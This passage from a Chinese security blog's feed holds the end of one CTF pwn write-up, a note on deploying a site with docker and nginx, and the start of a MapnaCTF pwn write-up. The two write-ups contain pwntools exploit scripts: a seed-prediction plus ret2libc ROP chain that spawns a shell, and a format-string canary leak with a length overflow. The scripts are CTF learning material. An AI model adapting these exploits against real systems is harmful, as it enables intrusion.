v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>  unsigned <span class="token builtin">int</span> seed<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>  init<span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  seed <span class="token operator">=</span> time<span class="token punctuation">(</span>0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>  puts<span class="token punctuation">(</span><span class="token string">"Menlina: Well tarnished, tell me thy name."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> 0x12uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token string">"I see,%s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">31513</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Menlina: Well tarnished, tell me thy name.'</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span> <span class="token operator">*</span> <span class="token number">0x12</span><span class="token punctuation">)</span> seed <span class="token operator">=</span> <span class="token number">0</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v6 <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Please guess the number:'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>addr <span class="token operator">=</span> <span class="token number">0x40125D</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401423</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401423</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'brilliant mind.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token number">0xe3b01</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="EzSignIn"><a href="#EzSignIn" class="headerlink" title="EzSignIn"></a>EzSignIn</h2><p>直接<code>nc</code>到远程<code>cat flag</code>即可</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于已有项目部署网站</title>
      <link href="/2024/01/29/ji-yu-yi-you-xiang-mu-bu-shu-wang-zhan/ji-yu-yi-you-xiang-mu-bu-shu-wang-zhan/"/>
      <url>/2024/01/29/ji-yu-yi-you-xiang-mu-bu-shu-wang-zhan/ji-yu-yi-you-xiang-mu-bu-shu-wang-zhan/</url>
      
        <content type="html"><![CDATA[<p>被拉过去帮忙给项目部署网站，之前从来没有接触过这些，现学了一些知识，记录一下过程和过程中遇到的一些问题</p><h2 id="前置环境要求"><a href="#前置环境要求" class="headerlink" title="前置环境要求"></a>前置环境要求</h2><ul><li>安装<code>vim</code>、<code>curl</code>、<code>git</code>、<code>pip</code>、<code>nginx</code>、<code>net-tools</code></li></ul><p><code>curl</code>是为了安装<code>docker</code>，但也可以通过<code>pip</code>安装，就不需要安装<code>curl</code>了</p><p><code>net-tools</code>用来使用<code>ifconfig</code>查<code>ip</code>地址</p><p>安装指令也很简单，就是<code>sudo apt install xxx</code>，安装之前可以先更新一下<code>sudo apt update</code></p><p>个人不习惯进<code>su</code>（因为我的<code>zsh</code>主题好看！），但是经常需要输入密码，嫌麻烦可以<code>sudo su</code></p><ul><li><p>安装<code>docker</code>和<code>docker-compose</code></p><ul><li><p><code>docker</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> get.docker.com <span class="token parameter variable">-o</span> get-docker.sh<span class="token function">sudo</span> <span class="token function">sh</span> get-docker.sh<span class="token function">rm</span> get-docker.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>docker</code>安装方法网上还有很多，比如<code>sudo pip install docker</code>，但我看这个顺眼（</p></li><li><p><code>docker-compose</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip <span class="token function">install</span> <span class="token function">docker-compose</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接安装会遇到报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR: <span class="token function">docker</span> <span class="token number">7.0</span>.0 has requirement requests<span class="token operator">>=</span><span class="token number">2.26</span>.0, but you<span class="token string">'ll have requests 2.22.0 which is incompatible.Installing collected packages: docopt, dockerpty, distro, attrs, pyrsistent, jsonschema, python-dotenv, websocket-client, urllib3, packaging, bcrypt, pycparser, cffi, pynacl, cryptography, paramiko, docker, texttable, docker-composeAttempting uninstall: distroFound existing installation: distro 1.4.0Not uninstalling distro at /usr/lib/python3/dist-packages, outside environment /usrCan'</span>t uninstall <span class="token string">'distro'</span><span class="token builtin class-name">.</span> No files were found to uninstall.Attempting uninstall: urllib3Found existing installation: urllib3 <span class="token number">1.25</span>.8Not uninstalling urllib3 at /usr/lib/python3/dist-packages, outside environment /usrCan<span class="token string">'t uninstall '</span>urllib3<span class="token string">'. No files were found to uninstall.Attempting uninstall: pynaclFound existing installation: PyNaCl 1.3.0Not uninstalling pynacl at /usr/lib/python3/dist-packages, outside environment /usrCan'</span>t uninstall <span class="token string">'PyNaCl'</span><span class="token builtin class-name">.</span> No files were found to uninstall.Attempting uninstall: cryptographyFound existing installation: cryptography <span class="token number">2.8</span>Not uninstalling cryptography at /usr/lib/python3/dist-packages, outside environment /usrCan<span class="token string">'t uninstall '</span>cryptography'. No files were found to uninstall.Successfully installed attrs-23.2.0 bcrypt-4.1.2 cffi-1.16.0 cryptography-42.0.1 distro-1.9.0 docker-7.0.0 docker-compose-1.29.2 dockerpty-0.4.1 docopt-0.6.2 jsons<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>嗯其实看第一句就好了：<code>has requirement requests&gt;=2.26.0</code>所以要先升级<code>requests</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> requests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul><h2 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h2><ul><li><p>先把项目<code>git clone</code>到本地，根据<code>dockerfile</code>中的内容在根目录指定路径创建数据库文件夹</p></li><li><p><code>ifconfig</code>查本地<code>ip</code>之后把项目文件中<code>settings</code>和<code>nginx.conf</code>中用到<code>ip</code>的地方改成本地<code>ip</code></p></li><li><p>接下来在有<code>dockerfile</code>的文件夹下生成容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有可能遇到报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:File <span class="token string">"/usr/local/bin/docker-compose"</span>, line <span class="token number">8</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>sys.exit<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">))</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/main.py"</span>, line <span class="token number">81</span>, <span class="token keyword">in</span> maincommand_func<span class="token punctuation">(</span><span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/main.py"</span>, line <span class="token number">200</span>, <span class="token keyword">in</span> perform_commandproject <span class="token operator">=</span> project_from_options<span class="token punctuation">(</span><span class="token string">'.'</span>, options<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/command.py"</span>, line <span class="token number">60</span>, <span class="token keyword">in</span> project_from_options<span class="token builtin class-name">return</span> get_project<span class="token punctuation">(</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/command.py"</span>, line <span class="token number">152</span>, <span class="token keyword">in</span> get_projectclient <span class="token operator">=</span> get_client<span class="token punctuation">(</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/docker_client.py"</span>, line <span class="token number">41</span>, <span class="token keyword">in</span> get_clientclient <span class="token operator">=</span> docker_client<span class="token punctuation">(</span>File <span class="token string">"/usr/local/lib/python3.8/dist-packages/compose/cli/docker_client.py"</span>, line <span class="token number">124</span>, <span class="token keyword">in</span> docker_clientkwargs <span class="token operator">=</span> kwargs_from_env<span class="token punctuation">(</span>environment<span class="token operator">=</span>environment, <span class="token assign-left variable">ssl_version</span><span class="token operator">=</span>tls_version<span class="token punctuation">)</span>TypeError: kwargs_from_env<span class="token punctuation">(</span><span class="token punctuation">)</span> got an unexpected keyword argument <span class="token string">'ssl_version'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把<code>-</code>去掉就好了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>容器里运行<code>makemigrations</code>和<code>migrate</code>来生成相应文件夹</p><ul><li><p><code>docker ps</code>查容器名，然后执行指令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> name python manage.py makemigrations<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> name python manage.py migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果<code>settings</code>里的<code>ip</code>改错了就可能遇到报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/db/backends/base/base.py"</span>, line <span class="token number">289</span>, <span class="token keyword">in</span> ensure_connectionself.connect<span class="token punctuation">(</span><span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/utils/asyncio.py"</span>, line <span class="token number">26</span>, <span class="token keyword">in</span> inner<span class="token builtin class-name">return</span> func<span class="token punctuation">(</span>*args, **kwargs<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/db/backends/base/base.py"</span>, line <span class="token number">270</span>, <span class="token keyword">in</span> connectself.connection <span class="token operator">=</span> self.get_new_connection<span class="token punctuation">(</span>conn_params<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/utils/asyncio.py"</span>, line <span class="token number">26</span>, <span class="token keyword">in</span> inner<span class="token builtin class-name">return</span> func<span class="token punctuation">(</span>*args, **kwargs<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/django/db/backends/mysql/base.py"</span>, line <span class="token number">247</span>, <span class="token keyword">in</span> get_new_connectionconnection <span class="token operator">=</span> Database.connect<span class="token punctuation">(</span>**conn_params<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/MySQLdb/init.py"</span>, line <span class="token number">121</span>, <span class="token keyword">in</span> Connect<span class="token builtin class-name">return</span> Connection<span class="token punctuation">(</span>*args, **kwargs<span class="token punctuation">)</span>File <span class="token string">"/usr/local/lib/python3.9/site-packages/MySQLdb/connections.py"</span>, line <span class="token number">193</span>, <span class="token keyword">in</span> initsuper<span class="token punctuation">(</span><span class="token punctuation">)</span>.init<span class="token punctuation">(</span>*args, **kwargs2<span class="token punctuation">)</span>MySQLdb.OperationalError: <span class="token punctuation">(</span><span class="token number">2002</span>, <span class="token string">"Can't connect to server on 'wrong ip' (115)"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时需要删除容器和镜像，将<code>ip</code>修改正确之后再次运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> rmi <span class="token operator">&lt;</span>your-image-id<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">rm</span> <span class="token operator">&lt;</span>your-docker-id<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中<code>id</code>可以通过<code>docker ps</code>查看</p></li></ul></li><li><p>将项目中的<code>nginx.conf</code>替换<code>/etc/nginx/sites-available</code>中的<code>default</code>(要把名字也改成<code>default</code>)，再加载<code>nginx</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nginx <span class="token parameter variable">-s</span> reload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nginx <span class="token parameter variable">-t</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>最后将项目文件中的<code>dist</code>文件复制到根目录创建的文件夹下</p></li></ul><hr><p>以上只针对这次项目的部署，很多环境在给的<code>dockerfile</code>中配好了，我也没怎么去研究，仅记录一下中间遇到的一些问题，虽然是一些小问题但是耗了我两三个小时…嗯仅供参考吧</p>]]></content>
      
      
      <categories>
          
          <category> web前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024MapnaCTF-pwn</title>
      <link href="/2024/01/24/2024mapnactf-pwn/2024mapnactf-pwn/"/>
      <url>/2024/01/24/2024mapnactf-pwn/2024mapnactf-pwn/</url>
      
        <content type="html"><![CDATA[<p>比赛期间在打春秋杯，赛后复现</p><h2 id="ninipwn"><a href="#ninipwn" class="headerlink" title="ninipwn"></a>ninipwn</h2><p>保护全开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞点在于格式化字符串、强制类型转换、变量溢出，存在后门函数<code>win</code>，覆盖返回地址的低位为<code>win</code>即可</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">encryption_service</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> text<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-110h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+108h] [rbp-8h]</span>  v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Text length: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>text_length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>text_length <span class="token operator">&lt;</span> <span class="token number">0x101</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Key: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Key selected: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fmt</span>    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Text: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> text<span class="token punctuation">,</span> text_length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">encrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Encrypted output: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> text<span class="token punctuation">,</span> text_length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Text length must be less than 256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>格式化字符串可以用来泄露<code>canary</code>绕过保护控制返回地址，限制<code>text_length</code>为<code>0x100</code>，但是过了<code>if</code>判断之后可以通过<code>key</code>溢出到<code>text_lenght</code>来达到增加长度的目的，<code>encrypt</code>函数中要求输入内容长度与<code>text_length</code>相同，在<code>encrypt</code>函数中会讲输入的内容与<code>key</code>进行异或</p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Text length:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4294967296</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">b'%39$p'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token string">b'\x19\x01'</span> r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Key: '</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>canary_bytes <span class="token operator">=</span> canary<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> canary_bytes <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token string">b'\x33'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Text:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 